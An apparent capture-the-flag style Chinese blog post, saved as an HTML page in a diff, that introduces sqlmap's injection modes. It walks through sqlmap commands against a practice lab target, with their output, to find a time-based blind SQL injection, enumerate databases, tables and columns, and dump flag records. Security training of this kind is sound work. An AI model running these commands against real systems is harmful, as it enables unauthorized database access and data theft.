@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>使用SQLMap进行一次注入攻击 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="tools," />
+  
+
+  <meta name="description" content="一、SQLMap简要介绍： sqlmap是一款自动化检测sql注入漏洞的工具，支持对MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等多种数据库进行检测。 支持5种注入模式：  1、基于布尔的盲注，即可以根据返回页面判断条件真假的注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用SQLMap进行一次注入攻击">
+<meta property="og:url" content="https://weizhaome.github.io/2021/03/30/%E4%BD%BF%E7%94%A8SQLMap%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、SQLMap简要介绍： sqlmap是一款自动化检测sql注入漏洞的工具，支持对MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等多种数据库进行检测。 支持5种注入模式：  1、基于布尔的盲注，即可以根据返回页面判断条件真假的注">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-03-30T02:08:00.000Z">
+<meta property="article:modified_time" content="2021-03-30T02:51:22.177Z">
+<meta property="article:author" content="weizhao">
+<meta property="article:tag" content="tools">
+<meta name="twitter:card" content="summary">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cben" rel="stylesheet">
+
+
+  
+    
+<link rel="stylesheet" href="/css/personal-style.css">
+
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQLMap%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-text">一、SQLMap简要介绍：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">二、攻击过程：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-使用SQLMap进行一次注入攻击" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">使用SQLMap进行一次注入攻击</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.03.30</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>weizhao</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="https://weizhaome.github.io/2021/03/30/%E4%BD%BF%E7%94%A8SQLMap%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="一、SQLMap简要介绍："><a href="#一、SQLMap简要介绍：" class="headerlink" title="一、SQLMap简要介绍："></a>一、SQLMap简要介绍：</h1><ul>
+<li>sqlmap是一款自动化检测sql注入漏洞的工具，支持对MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等多种数据库进行检测。</li>
+<li>支持5种注入模式：<blockquote>
+<ul>
+<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li>
+<li>2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
+<li>3、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
+<li>4、联合查询注入，可以使用 union 的情况下的注入；</li>
+<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h1 id="二、攻击过程："><a href="#二、攻击过程：" class="headerlink" title="二、攻击过程："></a>二、攻击过程：</h1><ul>
+<li>1、使用-u 或者 -url参数，扫描靶机，看是否存在sql注入漏洞，注入的类型，注入点：</li>
+</ul>
+<p><code>python sqlmap.py -u &quot;http://injectx1.lab.aqlab.cn:81/Pass-11/index.php?id=1&quot;</code></p>
+<p>返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 106 HTTP(s) requests:</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 8294 FROM (SELECT(SLEEP(5)))bcET)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该靶机存在基于时间的盲注。</p>
+<ul>
+<li>2、使用-dbs参数，得到该网站包含的数据库名称：</li>
+</ul>
+<p><code>python sqlmap.py -u &quot;http://injectx1.lab.aqlab.cn:81/Pass-11/index.php?id=1&quot; -dbs</code></p>
+<p>命令执行后会显示出包含的数据库数量和名称：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> available databases [6]:</span><br><span class="line">[*] error</span><br><span class="line">[*] head_error</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] kanwolongxia</span><br><span class="line">[*] post_error</span><br><span class="line">[*] widechar</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>3、得到数据库名称后，使用-D 参数指定一个数据库的名称，然后使用–tables参数得到该数据库下的表名：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-11&#x2F;index.php?id&#x3D;1&quot; -D error --tables</span><br></pre></td></tr></table></figure>
+
+<p>命令运行后发现error库下没有表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No tables found</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>4、继续换一个数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-11&#x2F;index.php?id&#x3D;1&quot; -D head_error --tables</span><br></pre></td></tr></table></figure>
+<p>发现这个数据库下面包含5个表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  Database: head_error</span><br><span class="line">[5 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| user      |</span><br><span class="line">| flag_head |</span><br><span class="line">| ip        |</span><br><span class="line">| refer     |</span><br><span class="line">| uagent    |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure></li>
+<li><p>5、通过表名可以初步判断一下需要的信息在哪个表中，这里我们要得到flag，所以对flag_head表做进一步的挖掘。使用–columns参数得到表包含的字段信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-11&#x2F;index.php?id&#x3D;1&quot; -D head_error -T flag_head --columns</span><br></pre></td></tr></table></figure>
+<p>可以看到flag_head表中有两个字段：flag_h1和Id.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: head_error</span><br><span class="line">Table: flag_head</span><br><span class="line">[2 columns]</span><br><span class="line">+---------+--------------+</span><br><span class="line">| Column  | Type         |</span><br><span class="line">+---------+--------------+</span><br><span class="line">| flag_h1 | varchar(255) |</span><br><span class="line">| Id      | int(11)      |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure></li>
+<li><p>6、接下来就让我们看看这个表里都有哪些数据吧！使用-C参数指定要查看表的哪些字段，使用–dump把数据存储下来：</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-11&#x2F;index.php?id&#x3D;1&quot; -D head_error -T flag_head -C “flag_h1,Id” --dump</span><br></pre></td></tr></table></figure>
+
+<p>命令执行后我们可以看到这个表里有三条记录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: head_error</span><br><span class="line">Table: flag_head</span><br><span class="line">[3 entries]</span><br><span class="line">+----------------+----+</span><br><span class="line">| flag_h1        | Id |</span><br><span class="line">+----------------+----+</span><br><span class="line">| zKaQ-ourHd | 1  |</span><br><span class="line">| zKaQ-Refer     | 2  |</span><br><span class="line">| zKaQ-ipip      | 3  |</span><br><span class="line">+----------------+----+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>7、后面我们通过修改各参数的值来获得所有数据库下所有表存储的数据信息，此处就不再赘述了。</li>
+<li>8、为了加快发现有价值信息的速度，可以使用–current-db 参数来获取网站当前使用的数据库是哪个，再对其做进一步的渗透。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-11&#x2F;index.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p>当前使用的数据库为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[11:16:01] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">kanwolongxia</span><br><span class="line">current database: &#39;kanwolongxia&#39;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>9、但是却发现当前数据库下没有表：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-11&#x2F;index.php?id&#x3D;1&quot; -D kanwologxia --tables</span><br></pre></td></tr></table></figure>
+返回：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No tables found</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul>
+        
+          <li class="item">
+            
+              <span>支付宝扫一扫</span>
+            
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2021/03/14/mysql%E7%9A%84information-schema%E5%BA%93/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+
+   
+      <div class="git"></div>
+   
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'https://weizhaome.github.io/2021/03/30/%E4%BD%BF%E7%94%A8SQLMap%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
